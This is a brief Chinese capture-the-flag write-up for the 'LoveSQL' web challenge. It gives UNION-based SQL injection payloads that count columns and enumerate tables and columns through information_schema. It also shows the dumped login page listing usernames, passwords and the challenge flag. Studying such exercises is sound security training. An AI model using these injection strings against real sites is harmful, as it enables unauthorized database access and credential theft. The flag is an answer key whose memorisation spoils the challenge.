## [极客大挑战 2019]LoveSQL

这个好像是第一题的升级。。。。

![image-20240815110422925](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240815110422925.png)

```
cc906f97ec3f2a44c4263178c47b9f1d
```

1. `1' order by 4#`到四的时候报错，说明字段数是3
2. `1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#`
3. `1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='l0ve1ysq1'#`

```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>check</title>
</head>
<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>

<body background='./image/background.jpg' style='background-repeat:no-repeat ;background-size:100% 100%; background-attachment: fixed;'>
					<br><br><br>
<h1 style='font-family:verdana;color:red;text-align:center;'>Login Success!</h1><br><br><br>
					</br>
    <p style='font-family:arial;color:#ffffff;font-size:30px;left:650px;position:absolute;'>Hello cl4y,glzjin,Z4cHAr7zCr,0xC4m3l,Ayrain,Akko,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,leixiao,flag！</p></br></br>
<p style='font-family:arial;color:#ffffff;font-size:30px;left:650px;position:absolute;'>Your password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag{c3f12931-47d4-49e7-86d0-39974f48d3a5}'</p>
</body>
</html>
```

得到flag

```
flag{c3f12931-47d4-49e7-86d0-39974f48d3a5}
```

